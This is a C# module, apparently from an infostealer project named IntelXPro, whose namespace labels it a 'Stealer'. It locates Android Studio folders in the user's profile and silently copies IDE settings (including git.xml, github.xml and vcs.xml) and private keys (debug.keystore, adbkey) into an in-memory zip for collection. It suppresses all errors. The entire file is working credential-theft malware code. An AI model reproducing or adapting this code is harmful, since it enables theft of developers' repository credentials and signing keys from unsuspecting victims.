using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class AndroidStudio : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Google");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "AndroidStudio";

            bool foundData = false;

            string[] androidStudioDirs = new string[]
            {
                Path.Combine(appDataPath, "AndroidStudio"),
                Path.Combine(userProfilePath, ".android"),
                Path.Combine(userProfilePath, ".AndroidStudio")
            };

            foreach (string androidStudioDir in androidStudioDirs)
            {
                if (Directory.Exists(androidStudioDir))
                {
                    foundData |= CollectFromDirectory(androidStudioDir, zip, counterApplications);
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string pathName = Path.GetFileName(basePath);

                string[] configFiles = new string[]
                {
                    "options\\ide.general.xml",
                    "options\\recentProjects.xml",
                    "options\\other.xml",
                    "options\\git.xml",
                    "options\\github.xml",
                    "options\\vcs.xml"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\AndroidStudio\\{pathName}\\{configFile.Replace("\\", "/")}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string[] versionDirs = Directory.GetDirectories(basePath, "AndroidStudio*", SearchOption.TopDirectoryOnly);
                
                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string optionsPath = Path.Combine(versionDir, "options");
                    if (Directory.Exists(optionsPath))
                    {
                        string[] optionFiles = Directory.GetFiles(optionsPath, "*.xml", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in optionFiles)
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\AndroidStudio\\{versionName}\\options\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string androidPath = Path.Combine(basePath, ".android");
                if (Directory.Exists(androidPath))
                {
                    string[] androidFiles = new string[]
                    {
                        "debug.keystore",
                        "adbkey",
                        "adbkey.pub"
                    };

                    foreach (string androidFile in androidFiles)
                    {
                        string fullPath = Path.Combine(androidPath, androidFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\AndroidStudio\\.android\\{androidFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
